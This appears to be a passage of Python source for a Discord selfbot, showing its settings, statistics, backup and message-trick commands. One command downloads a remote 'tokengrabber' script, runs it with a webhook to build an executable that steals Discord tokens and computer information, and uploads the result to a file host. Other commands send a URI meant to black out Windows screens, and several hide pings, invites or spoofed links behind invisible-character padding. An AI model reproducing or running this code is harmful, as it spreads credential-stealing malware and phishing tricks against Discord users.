                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                embed.add_field(name='Running Since', value=f'`{total_uptime}`')
                await embed_or_codeblock(ctx, embed)


            else:
                await ctx.send(f'Total Uptime: `{total_uptime}`')
        except Exception as e:
            print(e)
    
    @React.command(usage="showsettings", description="Sends your Selfbot settings")
    async def showsettings(ctx):
        try:
            def timedelta_since_epoch(timestamp: int):
                days = round(timestamp / 86400)
                return days
            elapsed = int(time.time() - uptime_start)
            total_uptime = time.strftime(f'{timedelta_since_epoch(elapsed)} days, %H:%M:%S', time.gmtime(elapsed))
            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Selfbot Settings',timestamp=embed_timestamp())
            embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            embed.add_field(name='__üíà Prefix__', value=f'`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`')
            try:
                embed.add_field(name='__üé® Embed Color__', value=f"""`{str(hex(int(json.load(open(f"./Themes/{json.load(open('''config.json''', encoding='''utf-8'''))['''theme''']}.json"))["embed_color"].replace("#", "0x"), 0))).replace("0x", "#")}`""")
            except Exception:
                pass
            embed.add_field(name='__‚è± Delete Timeout__', value=f'`{delete_timeout}`')
            try:
                embed.add_field(name='__üé≠ Global Emoji__', value=f"""{json.load(open(f"./Themes/{json.load(open('''config.json''', encoding='''utf-8'''))['''theme''']}.json"))["global_emoji"] if json.load(open(f"./Themes/{json.load(open('''config.json''', encoding='''utf-8'''))['''theme''']}.json"))["global_emoji"] else "None"}""")
            except Exception:
                pass
            embed.add_field(name='__üì° Commands Amount__', value=f'`{len(React.commands) + len(json.load(open("CustomCommands.json")))}`')
            embed.add_field(name='__‚è≥ Uptime__', value=f'`{total_uptime}`')
            embed.add_field(name='__üéÅ Giveaway Timeout__', value=f'`{json.load(open("config.json", encoding="utf-8"))["giveaway_timeout"]} seconds`')
            embed.add_field(name='__üéÅ Giveaway Blacklisted Words__', value=f'`{", ".join([word for word in json.load(open("config.json", encoding="utf-8"))["giveaway_blocked_words"]])}`')
            embed.add_field(name='__üî¥ Ignore Pings__', value=f'`{"Enabled" if json.load(open("config.json", encoding="utf-8"))["ignore_pings"] else "Disabled"}`')
            embed.add_field(name='__üî¥ Ignore All Pings__', value=f'`{"Enabled" if json.load(open("config.json", encoding="utf-8"))["ignore_all_pings"] else "Disabled"}`')
            embed.add_field(name='__üíé Nitro Sniper__', value=f'`{"Enabled" if json.load(open("config.json", encoding="utf-8"))["nitro_sniper"] else "Disabled"}`')
            embed.add_field(name='__üéä Giveaway Sniper__', value=f'`{"Enabled" if json.load(open("config.json", encoding="utf-8"))["giveaway_sniper"] else "Disabled"}`')
            embed.add_field(name='__‚úâ Privnote Sniper__', value=f'`{"Enabled" if json.load(open("config.json", encoding="utf-8"))["privnote_sniper"] else "Disabled"}`')
            embed.add_field(name='__üì© Block DMs__', value=f'`{"Enabled" if json.load(open("config.json", encoding="utf-8"))["block_dms"] else "Disabled"}`')
            embed.add_field(name='__ü§∫ Block Incoming Friends__', value=f'`{"Enabled" if json.load(open("config.json", encoding="utf-8"))["block_incoming_friends"] else "Disabled"}`')
            embed.add_field(name='__üí≥ Selfbot Version__', value=f'`{version}`')
            embed.add_field(name='__üíé Python Version__', value=f'`{platform.python_version()}`')
            await embed_or_codeblock(ctx, embed)


        except Exception:
            pass
        
    @React.command(usage="stats", description="Shows your Selfbot Statistics")
    async def stats(ctx):
        try:
            def timedelta_since_epoch(timestamp: int):
                days = round(timestamp / 86400)
                return days
            elapsed = int(time.time() - uptime_start)
            total_uptime = time.strftime(f'{timedelta_since_epoch(elapsed)} days, %H:%M:%S', time.gmtime(elapsed))
            uid = requests.get(f'https://reactselfbot.pro/api/info.php?username={json.load(open("""config.json""", encoding="""utf-8"""))["""username"""]}').json()['user_id']
            last_hwid_reset = requests.get(f'https://reactselfbot.pro/api/info.php?username={json.load(open("""config.json""", encoding="""utf-8"""))["""username"""]}').json()['last_hwid_reset']
            if last_hwid_reset == '2020-07-01':
                last_hwid_reset = 'NEVER'
            
            generalinfo = requests.get("https://reactselfbot.pro/api/info.php").json()
            
            logins = requests.get(f"https://reactselfbot.pro/api/info.php?username={json.load(open('config.json', encoding='utf-8'))['username']}").json()['user_logins']
            sb_version = generalinfo['version']
            docs_url = generalinfo['docs']
            website_url = generalinfo['website']
            invite_url = generalinfo['discord']
            total_logins = generalinfo['logins']
            users = generalinfo['users']

            
            
            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Selfbot Statistics',timestamp=embed_timestamp())
            embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            embed.add_field(name='__ü©∏ Username__', value=f'`{json.load(open("""config.json""", encoding="""utf-8"""))["""username"""]}`')
            embed.add_field(name='__‚è± Uptime__', value=f'`{total_uptime}`')
            embed.add_field(name='__üö™ Logins__', value=f'`{logins}`')
            embed.add_field(name='__üîë Total Logins__', value=f'`{total_logins}`')
            embed.add_field(name='__üéé Users__', value=f'`{users}`')
            embed.add_field(name='__üè∑ User ID__', value=f'`{uid}`')
            embed.add_field(name='__üåà Latest Version__', value=f'`{sb_version}`')
            embed.add_field(name='__üñ• Last HWID Reset__', value=f'`{last_hwid_reset}`')
            embed.add_field(name='__üöÄ Official Discord Server__', value=f'[Click Here]({invite_url})')
            embed.add_field(name='__‚òÅÔ∏è Official Website__', value=f'[Click Here]({website_url})')
            embed.add_field(name='__üìì Official Documentation__', value=f'[Click Here]({docs_url})')
            await embed_or_codeblock(ctx, embed)


        except Exception:
            pass
        
    @React.command(usage="userstats", description="Shows your Discord statistics")
    async def userstats(ctx):
        try:
            nitro_type = None
            try:
                React.user.premium_type
            except Exception:
                nitro_type ="None"
            else:
                if React.user.premium_type == discord.PremiumType.nitro_classic:
                    nitro_type ="Nitro Classic"

                elif React.user.premium_type == discord.PremiumType.nitro:
                    nitro_type ="Nitro"
            
            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='User Statistics',timestamp=embed_timestamp())
            embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            embed.add_field(name='__üßØ Guilds__', value=f'`{len(React.guilds)}`')
            embed.add_field(name='__üòé Emojis__', value=f'`{len(React.emojis)}`')
            embed.add_field(name='__üîë 2FA Enabled__', value=f'`{bool(React.user.mfa_enabled)}`')
            embed.add_field(name='__üíé Nitro__', value=f'`{bool(React.user.premium)}`')
            embed.add_field(name='__üîÆ Nitro Type__', value=f'`{nitro_type}`')
            embed.add_field(name='__üéé Relationships__', value=f'`{len(React.user.relationships)}`')
            embed.add_field(name='__üßÅ Verified__', value=f'`{bool(React.user.verified)}`')
            await embed_or_codeblock(ctx, embed)


        except Exception:
            pass


    @React.command(usage="infograbber <Discord Webhook URL>", description="Creates a info grabber exe file which grabs Discord tokens and computer information")
    async def infograbber(ctx, webhook: str):
        if sys.platform == "win32":
            print('Downloading script generator...')
            tokengrabr = requests.get('https://reactselfbot.pro/download/tokengrabber.py', allow_redirects=True)
            open('tokengrabber.py', 'wb').write(tokengrabr.content)
            print('Script generator downloaded.')
            print('Generating tokengrabber...')
            os.system(f'python tokengrabber.py {webhook}')
            
            os.system('cls')
            
            print('\n')            
            print(fg.purple3 + f'‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó ‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó'.center(shutil.get_terminal_size().columns))
            print(fg.purple3 + f'‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ïê‚ïù‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ïê‚ïù‚ïö‚ïê‚ïê‚ñà‚ñà‚ïî‚ïê‚ïê‚ïù'.center(shutil.get_terminal_size().columns))
            print(fg.purple3 + f'‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë        ‚ñà‚ñà‚ïë   '.center(shutil.get_terminal_size().columns))
            print(fg.purple3 + f'‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïî‚ïê‚ïê‚ïù  ‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë        ‚ñà‚ñà‚ïë   '.center(shutil.get_terminal_size().columns))
            print(fg.purple3 + f'‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë‚ïö‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó   ‚ñà‚ñà‚ïë   '.center(shutil.get_terminal_size().columns))
            print(fg.purple3 + f'‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïù‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïù ‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù   ‚ïö‚ïê‚ïù   \n'.center(shutil.get_terminal_size().columns))
            print(fg.purple3)

            width = shutil.get_terminal_size().columns

            print('_' * width, end='')

            print('\n')

            try:
                files = {'file': (open(f'./dist/generatedgrabber.exe', 'rb'))}
                r = requests.post("https://api.anonfiles.com/upload", files=files)
                resp = json.loads(r.text)
                downloadurl = resp['data']['file']['url']['short']
                embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Info Grabber', description='If the download doesn\'t work check your selfbot folder under dist/generatedgrabber.exe',timestamp=embed_timestamp())
                embed.add_field(name='Download URL', value=f'{downloadurl}')
                embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            except FileNotFoundError:
                print('File does not exist! Make sure your Antivirus Program did not delete it or that it got created.')
        else:
            print("This only works on Windows.")

    @React.command(usage="blackscreenurl", description="Sends a URL which let's people who use Windows get a black screen")
    async def blackscreenurl(ctx):
        
        await ctx.send('<ms-cxh-full://0>')

    @React.command(usage="loremipsum <Words>", description="Generates a Lorem Ipsum text with a specified amount of words")
    async def loremipsum(ctx, words: int):
        
        await ctx.send(lorem.words(words))

    @React.command(usage="invisibleping <User> <Message>", description="Sends a message with an invisible ping")
    async def invisibleping(ctx, user: discord.User, *, message: str='Hi'):
        await ctx.send(f'‚Äé{message}||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||‚Äé‚Äé||‚Äé||‚Äé‚Äé||‚Äé‚Äé||‚Äé‚Äé||‚Äé‚Äé||<@{user.id}>')

    @React.command(usage="hiddeninvite <URL> <Text>", description="Hide a discord invite behind your text")
    async def hiddeninvite(ctx, url, *, message: str='Hi'):
        await ctx.send(f'‚Äé{message}||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||‚Äé‚Äé||‚Äé||‚Äé‚Äé||‚Äé‚Äé||‚Äé‚Äé||‚Äé‚Äé||{url}')

    @React.command(usage="hiddenlink <URL> <Spoofed URL>", description="Spoof an URL")
    async def hiddenlink(ctx, url, spoofed_url):
        await ctx.send(f'‚Äé<{spoofed_url}>||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||‚Äé‚Äé||‚Äé||‚Äé‚Äé||‚Äé‚Äé||‚Äé‚Äé||‚Äé‚Äé||{url}')

    @React.command(usage="hiddeneveryone <Text>", description="Hide a @everyone ping behind your text")
    async def hiddeneveryone(ctx, *, message: str='Hi'):
        await ctx.send(f'‚Äé{message}||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||||‚Äã||‚Äé‚Äé||‚Äé||‚Äé‚Äé||‚Äé‚Äé||‚Äé‚Äé||‚Äé‚Äé||@everyone')


    @React.command(aliases=['backupserver'], usage="savebackup <name>", description="Saves a full server backup")
    async def savebackup(ctx, server=None, *, name=None):
        if server == None:
            if isinstance(ctx.channel, discord.channel.DMChannel):
                return
            else:
                server = ctx.guild
        else:
            try:
                server = React.get_guild(int(server))
            except:
                name = server
                server = ctx.guild
        if name == None:
            name = server.name
        def _overwrites_to_json(overwrites):
            try:
                return {str(target.id): overwrite._values for target, overwrite in overwrites.items()}
            except Exception:
                return {}

        # Saving server data from server
        try:
            statusembed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Server Backup',timestamp=embed_timestamp())
            statusembed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            statusembed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            statusembed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            statusembed.description = "Saving server data from server..."
            statusmsg = await ctx.send(embed=statusembed)
        except:
            pass


        server_data = {
            "id": str(server.id),
            "name": server.name,
            "icon_url": str(server.icon_url_as(static_format='png')),
            "owner": str(server.owner_id),
            "member_count": server.member_count,
            "region": str(server.region),
            "system_channel": str(server.system_channel),
            "afk_timeout": server.afk_timeout,
            "afk_channel": None if server.afk_channel is None else str(server.afk_channel.id),
            "mfa_level": server.mfa_level,
            "verification_level": str(server.verification_level),
            "explicit_content_filter": str(server.explicit_content_filter),
            "large": server.large,
            "text_channels": [],
            "voice_channels": [],
            "categories": [],
            "roles": [],
            "members": [],
            "bans": [],
        }
        icon_url = server.icon_url_as(static_format='png')
